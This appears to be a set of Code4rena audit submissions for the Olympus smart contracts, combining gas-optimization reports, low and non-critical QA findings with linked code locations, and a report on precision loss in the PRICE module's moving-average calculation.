https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254   ## G-03 internal functions only called once can be inlined to save gas  Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.  2 instances in 2 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L391-395  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L137-L141   ## G-04 Using bools for storage incurs overhead  Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled. https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use uint256(1) and uint256(2) for true/false  11 instances in 5 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L113 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L181 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L194 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L197  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L62  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L63 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L66  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L24  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L33  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L105 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L117   ## G-05 Using > 0 costs more gas than != 0 when used on a uint in a require() statement  This change saves 6 gas per instance  1 instance in 1 file:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L247   ## G-06 ++i costs less gas than i++, especially when it’s used in for-loops (--i/i-- too)  Saves 6 gas PER LOOP  2 instances in 1 file:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49 https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64   ## G-07 Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html Use a larger size then downcast where needed  88 instances in 10 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L51  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L25  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L45 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L115 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L148 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L200  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L27 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L28 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L44 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L47 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L50 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L53 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L56 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L75 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L76 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L84 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L87 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L97 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L113 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L289  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L27  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L51 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L52 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L53 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L54 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L83 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L86 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L108 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L116 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L128 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L129 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L210 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L216 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L375 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L376 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L377 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L403 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L404 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L418 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L455 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L456 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L528 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L529 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L530 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L535 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L536 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L560 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L561 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L562 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L665 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L705 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L707 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L708 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L717 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L719 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L720  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L58 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L69  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L13 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L14 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L15 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L16 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L17 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L18 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L19 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L20 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L31 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L32 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L33 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L85 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L93 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L94 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L95 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L101 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L110 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L111 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L112   ## G-08 Using private rather than public for constants, saves gas If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  9 instances in 4 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137    ## G-09 Empty blocks should be removed or emit something  The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be abstract and the function signatures be added without any default implementation. If the block is an empty if-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (if(x){}else if(y){...}else{...} => if(!x){if(y){...}else{...}})  2 instances in 1 file:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L139 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L143   ## G-10 calldata instead of memory for read-only function parameter  If a reference type function parameter is read-only, it is cheaper in gas to use calldata instead of memory. Calldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory. Try to use calldata as a data location because it will avoid copies and also makes sure that the data cannot be modified.  5 instances in 3 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L139 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L143 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L393  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L53 
## [L-01]: Upgrades to `VOTES` module can lead to governance vulnerabilities The comment in [VOTES.sol#L10](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L10): ``` /// @dev    This is currently a substitute module that stubs gOHM. ``` means that the `VOTES` module is temporary and will be replaced by a form of governance token (could be staked gOHM for example). One must be sure before upgrading that the new token does not present a `transfer` function nor any mechanism or bypass that effectively allows to transfer tokens in between addresses. If the contrary is true, it would lead to a double endorsing issue (possibility to call [`OlympusGovernance.endorseProposal()`](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L181) a second time after getting the same tokens to a different address). Note that a bypass that allows transfer of tokens without delay could be used by an attacker to get unlimited endorsement power and execute a DoS on the governance by frontrunning calls to `activateProposal()` with a self-endorsed proposal.  ## [L-02]: Voting temporarily reduces endorsing power When calling `vote()` on the governance, `VOTES` token are transfered temporarily to the governance contract ([Governance.sol#L259](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L259)), so one must wait before being able to endorse a  proposal again.  ## [L-03]: Missing events for critical changes in system parameters Change of critical system parameters should come with an event emission to allow for monitoring of potentially dangerous or malicious changes. Occurrencies of this issue are [Kernel.sol#L77](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L77), [Kernel.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L127), [BondCallback.sol#L190](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L190)  ## [L-04]: `executor` can become also `admin` At [Kernel.sol#L253](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L253) the `executor` is allowed to become also `admin` of the `Kernel`. Consider checking that the `admin` set is not the `executor` (and vice versa at [Kernel.sol#L251](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L251)) to avoid full centralization of the system.  ## [L-05]: Open `TODO`s Open TODOs can point to architecture or programming issues that still need to be resolved. Occurrencies at [TreasuryCustodian.sol#L51-L56](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L51-L56), [Operator.sol#L657](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L657). All issues raised in TODOs should be addressed before deployment.  ## [NC-01]: Missing/Incomplete/Incorrect Natspec comments:  - missing Natspec comments for public / external functions:   - [TRSRY.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L59)   - [MINTR.sol#L33](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/MINTR.sol#L33)   - [MINTR.sol#L37](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/MINTR.sol#L37)   - [VOTES.sol#L35](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L35)   - [VOTES.sol#L39](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L39)   - [Governance.sol#L61](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L61)   - [Governance.sol#L70](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L70)  - missing Natspec comments for public getters:    - [Kernel.sol#L63](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L63)   - [MINTR.sol#L9](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/MINTR.sol#L9)   - [RANGE.sol#L65](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L65)   - [BondCallback.sol#L24-L26](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L24-L26)   - [Governance.sol#L56-L57](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L56-L57)   - [Operator.sol#L83](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L83)   - [Operator.sol#L86](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L86)   - [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L89)    - missing function parameters:   - [Kernel.sol#L75](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L75)   - [Kernel.sol#L126](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L126)   - [Kernel.sol#L234](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L234)   - [INSTR.sol#36](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L36)   - [INSTR.sol#42](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L42)   - [TRSRY.sol#L63](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L63)   - [TRSRY.sol#L74](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L74)   - [TRSRY.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L92)   - [TRSRY.sol#L105](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L105)   - [TRSRY.sol#L121](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L121)   - [VOTES.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L45)   - [VOTES.sol#L50](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L50)   - [Governance.sol#L144](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L144)  - missing function return values   - [INSTR.sol#42](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L42)   - [RANGE.sol#L274](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L274)   - [RANGE.sol#L279](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L279)   - [RANGE.sol#L289](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L289)   - [RANGE.sol#L300](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L300)   - [RANGE.sol#L318](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L318)   - [RANGE.sol#L329](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L329)   - [RANGE.sol#L339](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L339)   - [Governance.sol#L144](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L144)   - [Governance.sol#L150](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L150)   - [IHeart.sol#L17](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/interfaces/IHeart.sol#L17)   - [IOperator.sol#L143](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/interfaces/IOperator.sol#L143)  - incorrect comments:   - [Kernel.sol#L167](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L167): should be `Mapping of keycode to module address`   - [Kernel.sol#L170](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L170): should be `Mapping of keycode to module address`   - [Kernel.sol#L180](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L180): `Policy` and `Keycode` should be inverted   Consider adding missing Natspec comments according to the relevant [section](https://docs.soliditylang.org/en/v0.8.16/natspec-format.html#natspec) in the solidity docs.  ## [NC-02]: Redundant code: At [Governance.sol#L223](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L223) and [Governance.sol#L306](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L306) use of `bool == true` is equivalent to just `bool`.  ## [NC-03]: Use custom error when `netVotes` should underflow In [QA.md#L82](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/audit/QA.md#L82) check that `yesVotesForProposal[activeProposal.proposalId] > noVotesForProposal[activeProposal.proposalId]` before subtracting and revert with custom error `NotEnoughVotesToExecute` if not. This avoids to have a Panic error due to underflow in case `netVotes` should underflow.
## [G-01] onlyKernel MODIFIER IS NOT NEEDED FOR VIEW FUNCTIONS Calling the following `requestPermissions` view functions, which are called by non-view functions, such as [`_activatePolicy`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L295-L323) and [`_deactivatePolicy`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325-L346), will use gas. Because these `requestPermissions` functions have the `onlyKernel`, more run-time gas is used when calling these. Since view functions do not modify states, it is safe for these view functions to not use `onlyKernel`. Moreover, other similar view functions, such as [`Operator.requestPermissions`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L171-L186) do not use `onlyKernel` already. Please consider removing `onlyKernel` from the following view functions.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L60-L76 ```solidity     function requestPermissions()         external         view         override         onlyKernel         returns (Permissions[] memory requests)     {         Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();         Keycode MINTR_KEYCODE = MINTR.KEYCODE();          requests = new Permissions[](4);         requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);         requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.withdrawReserves.selector);         requests[2] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);         requests[3] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L70-L80 ```solidity     function requestPermissions()         external         view         override         onlyKernel         returns (Permissions[] memory requests)     {         requests = new Permissions[](2);         requests[0] = Permissions(INSTR.KEYCODE(), INSTR.store.selector);         requests[1] = Permissions(VOTES.KEYCODE(), VOTES.transferFrom.selector);     } ```  ## [G-02] REVERT CHECK CAN BE PLACED AT START OF FUNCTION BODY IF POSSIBLE When a `revert` check is allowed to be placed at the start of the function body, the subsequent operations that cost more gas are prevented from running if it does revert.  `if (length == 0) revert INSTR_InstructionsCannotBeEmpty()` can be placed after `uint256 length = instructions_.length;` in the following code. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L42-L79 ```solidity     function store(Instruction[] calldata instructions_) external permissioned returns (uint256) {         uint256 length = instructions_.length;         uint256 instructionsId = ++totalInstructions;          Instruction[] storage instructions = storedInstructions[instructionsId];          if (length == 0) revert INSTR_InstructionsCannotBeEmpty();          ...     } ```  `if (activeProposal.proposalId == 0) { revert NoActiveProposalDetected(); }` and `if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { revert UserAlreadyVoted(); }` can be placed above `uint256 userVotes = VOTES.balanceOf(msg.sender);` in the following code. https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262 ```solidity     function vote(bool for_) external {         uint256 userVotes = VOTES.balanceOf(msg.sender);          if (activeProposal.proposalId == 0) {             revert NoActiveProposalDetected();         }          if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {             revert UserAlreadyVoted();         }          ...     } ```  ## [G-03] VARIABLE DOES NOT NEED TO BE INITIALIZED TO ITS DEFAULT VALUE Explicitly initializing a variable with its default value costs more gas than uninitializing it. For example, `uint256 i` can be used instead of `uint256 i = 0` in the following code. ```solidity Kernel.sol   397: for (uint256 i = 0; i < reqLength; ) {  utils\KernelUtils.sol   43: for (uint256 i = 0; i < 5; ) {   58: for (uint256 i = 0; i < 32; ) { ```  ## [G-04] ARRAY LENGTH CAN BE CACHED OUTSIDE OF LOOP Caching the array length outside of the loop and using the cached length in the loop costs less gas than reading the array length for each iteration. For example, `instructions.length` in the following code can be cached outside of the loop like `uint256 instructionsLength = instructions.length`, and `i < instructionsLength` can be used for each iteration. ```solidity policies\Governance.sol   278: for (uint256 step; step < instructions.length; ) { ```  ## [G-05] ++VARIABLE CAN BE USED INSTEAD OF VARIABLE++ ++variable costs less gas than variable++. For example, `i++` can be changed to `++i` in the following code. ```solidity policies\Operator.sol   488: decimals++;   670: _status.low.count++;   686: _status.high.count++;    utils\KernelUtils.sol   49: i++;   64: i++; ```  ## [G-06] X = X + Y CAN BE USED INSTEAD OF X += Y x = x + y costs less gas than x += y. For example, `balanceOf[to_] += amount_` can be changed to `balanceOf[to_] = balanceOf[to_] + amount_` in the following code. ```solidity modules\PRICE.sol   136: _movingAverage += (currentPrice - earliestPrice) / numObs;   222: total += startObservations_[i];  modules\TRSRY.sol   96: reserveDebt[token_][msg.sender] += amount_;   97: totalDebt[token_] += amount_;   131: if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;  modules\VOTES.sol   58: balanceOf[to_] += amount_;  policies\BondCallback.sol   143: _amountsPerMarket[id_][0] += inputAmount_;   144: _amountsPerMarket[id_][1] += outputAmount_;  policies\Governance.sol   198: totalEndorsementsForProposal[proposalId_] += userVotes;   252: yesVotesForProposal[activeProposal.proposalId] += userVotes;   254: noVotesForProposal[activeProposal.proposalId] += userVotes;  policies\Heart.sol   103: lastBeat += frequency(); ```
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139   # Vulnerability details  Now the precision is lost in moving average calculations as the difference is calculated separately and added each time, while it typically can be small enough to lose precision in the division involved.  For example, `10000` moves of `990` size, `numObservations = 1000`. This will yield `0` on each update, while must yield `9900` increase in the moving average.  ## Proof of Concept  Moving average is calculated with the addition of the difference:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139  ```solidity         // Calculate new moving average         if (currentPrice > earliestPrice) {             _movingAverage += (currentPrice - earliestPrice) / numObs;         } else {             _movingAverage -= (earliestPrice - currentPrice) / numObs;         } ```  `/ numObs` can lose precision as `currentPrice - earliestPrice` is usually small.  It is returned on request as is:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193  ```solidity     /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).     function getMovingAverage() external view returns (uint256) {         if (!initialized) revert Price_NotInitialized();         return _movingAverage;     } ```  ## Recommended Mitigation Steps  Consider storing the cumulative `sum`, while returning `sum / numObs` on request:  